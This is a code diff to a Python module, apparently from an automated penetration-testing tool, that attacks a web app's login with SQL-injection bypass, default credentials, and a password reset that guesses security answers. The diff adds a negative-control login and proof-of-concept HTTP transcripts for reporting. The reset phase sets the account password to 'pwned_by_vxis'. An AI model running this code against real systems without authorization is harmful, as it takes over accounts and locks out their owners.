@@ -20,6 +20,52 @@ LOGIN_PATHS = _load_ds("attempt_auth", "login_paths")  # ADR-007 Phase 3-9 — d
 RESET_PATHS = _load_ds("attempt_auth", "reset_paths")  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json
 
 
+def _preview_text(text: str, limit: int = 240) -> str:
+    return " ".join(str(text or "").split())[:limit]
+
+
+def _extract_token_and_user_info(data: dict[str, Any]) -> tuple[str, dict[str, str]]:
+    token = ""
+    for key_path in [("authentication", "token"), ("token",), ("access_token",), ("data", "token")]:
+        d: object = data
+        for k in key_path:
+            d = d.get(k, {}) if isinstance(d, dict) else {}
+        if isinstance(d, str) and len(d) > 20:
+            token = d
+            break
+    auth = data.get("authentication", data) if isinstance(data, dict) else {}
+    user_info = {
+        "email": auth.get("umail", auth.get("email", "")) if isinstance(auth, dict) else "",
+        "role": auth.get("role", "") if isinstance(auth, dict) else "",
+        "id": auth.get("bid", auth.get("id", "")) if isinstance(auth, dict) else "",
+    }
+    return token, user_info
+
+
+def _format_login_transcript(
+    endpoint: str,
+    creds: dict[str, str],
+    status: int,
+    preview: str,
+    *,
+    label: str,
+) -> str:
+    body = (
+        "{"
+        f"\"email\":\"{creds.get('email', '')}\","
+        f"\"password\":\"{creds.get('password', '')}\""
+        "}"
+    )
+    return (
+        f"[{label}]\n"
+        f"POST {endpoint} HTTP/1.1\n"
+        "Content-Type: application/json\n\n"
+        f"{body}\n\n"
+        f"HTTP/1.1 {status}\n\n"
+        f"{preview}"
+    )
+
+
 async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
     """Try multiple authentication methods against the target.
 
@@ -32,16 +78,20 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
             "login_endpoint": str,
             "credentials_used": dict,
             "all_attempts": [{"endpoint": ..., "creds": ..., "status": int}, ...],
+            "control_checks": {...},
+            "poc_http_exchange": str,
         }
     """
     from vxis.interaction.hands import SessionManager
 
     target = target_url.rstrip("/")
-    all_attempts: list[dict] = []
+    all_attempts: list[dict[str, Any]] = []
     result = {
         "authenticated": False, "method": "", "token": "",
         "user_info": {}, "login_endpoint": "", "credentials_used": {},
         "all_attempts": all_attempts,
+        "control_checks": {},
+        "poc_http_exchange": "",
     }
 
     _mgr = SessionManager()
@@ -73,75 +123,120 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
     if not active_login:
         return {**result, "error": "No login endpoint found"}
 
-    # Phase 2: Try SQLi bypass first (highest value)
-    for email, pwd in SQLI_CREDS:
+    async def _record_login_attempt(
+        email: str,
+        pwd: str,
+        *,
+        phase: str,
+    ) -> dict[str, Any] | None:
         try:
             r = await _session.request(
                 "POST", active_login, json_data={"email": email, "password": pwd}
             )
-            attempt = {"endpoint": active_login, "creds": f"{email}:{pwd}", "status": r.status}
-            all_attempts.append(attempt)
-
-            if r.status == 200:
-                data = r.response.json()
-                token = ""
-                user_info: dict[str, str] = {}
-                # Try common token locations
-                for key_path in [("authentication", "token"), ("token",), ("access_token",), ("data", "token")]:
-                    d: object = data
-                    for k in key_path:
-                        d = d.get(k, {}) if isinstance(d, dict) else {}
-                    if isinstance(d, str) and len(d) > 20:
-                        token = d
-                        break
-                # Extract user info
-                auth = data.get("authentication", data)
-                user_info = {
-                    "email": auth.get("umail", auth.get("email", "")),
-                    "role": auth.get("role", ""),
-                    "id": auth.get("bid", auth.get("id", "")),
-                }
-                if token:
-                    logger.info("SQLi auth bypass SUCCESS: %s", email)
-                    return {
-                        **result,
-                        "authenticated": True, "method": "sqli_bypass",
-                        "token": token, "user_info": user_info,
-                        "login_endpoint": active_login,
-                        "credentials_used": {"email": email, "password": pwd},
-                    }
         except Exception:
+            return None
+        preview = _preview_text(r.text)
+        attempt = {
+            "phase": phase,
+            "endpoint": active_login,
+            "creds": f"{email}:{pwd}",
+            "status": r.status,
+            "body_length": r.body_length,
+            "response_preview": preview,
+            "token_observed": False,
+        }
+        try:
+            data = r.response.json()
+        except Exception:
+            data = {}
+        token, user_info = _extract_token_and_user_info(data if isinstance(data, dict) else {})
+        attempt["token_observed"] = bool(token)
+        if user_info:
+            attempt["user_info"] = user_info
+        all_attempts.append(attempt)
+        return {"response": r, "attempt": attempt, "token": token, "user_info": user_info}
+
+    baseline_control = await _record_login_attempt(
+        "vxis-negative-control@example.invalid",
+        "definitely-wrong-password",
+        phase="negative_control",
+    )
+
+    # Phase 2: Try SQLi bypass first (highest value)
+    for email, pwd in SQLI_CREDS:
+        outcome = await _record_login_attempt(email, pwd, phase="sqli_bypass")
+        if not outcome:
             continue
+        if outcome["response"].status == 200 and outcome["token"]:
+            logger.info("SQLi auth bypass SUCCESS: %s", email)
+            positive_attempt = outcome["attempt"]
+            control_checks = {
+                "negative_control": baseline_control["attempt"] if baseline_control else {},
+                "positive_control": positive_attempt,
+            }
+            poc_http_exchange = "\n\n".join(filter(None, [
+                _format_login_transcript(
+                    active_login,
+                    {"email": "vxis-negative-control@example.invalid", "password": "definitely-wrong-password"},
+                    baseline_control["attempt"]["status"],
+                    baseline_control["attempt"].get("response_preview", ""),
+                    label="negative_control",
+                ) if baseline_control else "",
+                _format_login_transcript(
+                    active_login,
+                    {"email": email, "password": pwd},
+                    positive_attempt["status"],
+                    positive_attempt.get("response_preview", ""),
+                    label="positive_bypass",
+                ),
+            ]))
+            return {
+                **result,
+                "authenticated": True, "method": "sqli_bypass",
+                "token": outcome["token"], "user_info": outcome["user_info"],
+                "login_endpoint": active_login,
+                "credentials_used": {"email": email, "password": pwd},
+                "control_checks": control_checks,
+                "poc_http_exchange": poc_http_exchange,
+            }
 
     # Phase 3: Try default credentials
     for email, pwd in DEFAULT_CREDS:
-        try:
-            r = await _session.request(
-                "POST", active_login, json_data={"email": email, "password": pwd}
-            )
-            attempt = {"endpoint": active_login, "creds": f"{email}:{pwd}", "status": r.status}
-            all_attempts.append(attempt)
-
-            if r.status == 200:
-                data = r.response.json()
-                token = ""
-                for key_path in [("authentication", "token"), ("token",), ("access_token",)]:
-                    d = data
-                    for k in key_path:
-                        d = d.get(k, {}) if isinstance(d, dict) else {}
-                    if isinstance(d, str) and len(d) > 20:
-                        token = d
-                        break
-                if token:
-                    logger.info("Default creds SUCCESS: %s:%s", email, pwd)
-                    return {
-                        **result,
-                        "authenticated": True, "method": "default_creds",
-                        "token": token, "login_endpoint": active_login,
-                        "credentials_used": {"email": email, "password": pwd},
-                    }
-        except Exception:
+        outcome = await _record_login_attempt(email, pwd, phase="default_creds")
+        if not outcome:
             continue
+        if outcome["response"].status == 200 and outcome["token"]:
+            logger.info("Default creds SUCCESS: %s:%s", email, pwd)
+            positive_attempt = outcome["attempt"]
+            control_checks = {
+                "negative_control": baseline_control["attempt"] if baseline_control else {},
+                "positive_control": positive_attempt,
+            }
+            poc_http_exchange = "\n\n".join(filter(None, [
+                _format_login_transcript(
+                    active_login,
+                    {"email": "vxis-negative-control@example.invalid", "password": "definitely-wrong-password"},
+                    baseline_control["attempt"]["status"],
+                    baseline_control["attempt"].get("response_preview", ""),
+                    label="negative_control",
+                ) if baseline_control else "",
+                _format_login_transcript(
+                    active_login,
+                    {"email": email, "password": pwd},
+                    positive_attempt["status"],
+                    positive_attempt.get("response_preview", ""),
+                    label="positive_default_creds",
+                ),
+            ]))
+            return {
+                **result,
+                "authenticated": True, "method": "default_creds",
+                "token": outcome["token"], "login_endpoint": active_login,
+                "credentials_used": {"email": email, "password": pwd},
+                "user_info": outcome["user_info"],
+                "control_checks": control_checks,
+                "poc_http_exchange": poc_http_exchange,
+            }
 
     # Phase 4: Try password reset with common security answers
     for reset_path in RESET_PATHS:
@@ -187,14 +282,64 @@ async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
                                     break
                             if token:
                                 logger.info("Password reset SUCCESS: %s answer=%s", email, ans)
+                                reset_preview = _preview_text(r.text)
+                                login_preview = _preview_text(r2.text)
+                                control_checks = {
+                                    "negative_control": baseline_control["attempt"] if baseline_control else {},
+                                    "positive_control": {
+                                        "phase": "password_reset",
+                                        "endpoint": active_login,
+                                        "creds": f"{email}:pwned_by_vxis",
+                                        "status": r2.status,
+                                        "body_length": r2.body_length,
+                                        "response_preview": login_preview,
+                                        "token_observed": True,
+                                    },
+                                    "reset_step": {
+                                        "endpoint": reset_path,
+                                        "status": r.status,
+                                        "response_preview": reset_preview,
+                                    },
+                                }
                                 return {
                                     **result,
                                     "authenticated": True, "method": "password_reset",
                                     "token": token, "login_endpoint": active_login,
                                     "credentials_used": {"email": email, "security_answer": ans},
                                     "reset_endpoint": reset_path,
+                                    "control_checks": control_checks,
+                                    "poc_http_exchange": "\n\n".join(filter(None, [
+                                        _format_login_transcript(
+                                            active_login,
+                                            {"email": "vxis-negative-control@example.invalid", "password": "definitely-wrong-password"},
+                                            baseline_control["attempt"]["status"],
+                                            baseline_control["attempt"].get("response_preview", ""),
+                                            label="negative_control",
+                                        ) if baseline_control else "",
+                                        (
+                                            f"[password_reset]\n"
+                                            f"POST {reset_path} HTTP/1.1\n"
+                                            "Content-Type: application/json\n\n"
+                                            f'{{"email":"{email}","answer":"{ans}","new":"pwned_by_vxis","repeat":"pwned_by_vxis"}}\n\n'
+                                            f"HTTP/1.1 {r.status}\n\n"
+                                            f"{reset_preview}"
+                                        ),
+                                        _format_login_transcript(
+                                            active_login,
+                                            {"email": email, "password": "pwned_by_vxis"},
+                                            r2.status,
+                                            login_preview,
+                                            label="positive_login_after_reset",
+                                        ),
+                                    ])),
                                 }
         except Exception:
             continue
 
-    return {**result, "all_attempts": all_attempts}
+    return {
+        **result,
+        "all_attempts": all_attempts,
+        "control_checks": {
+            "negative_control": baseline_control["attempt"] if baseline_control else {},
+        },
+    }
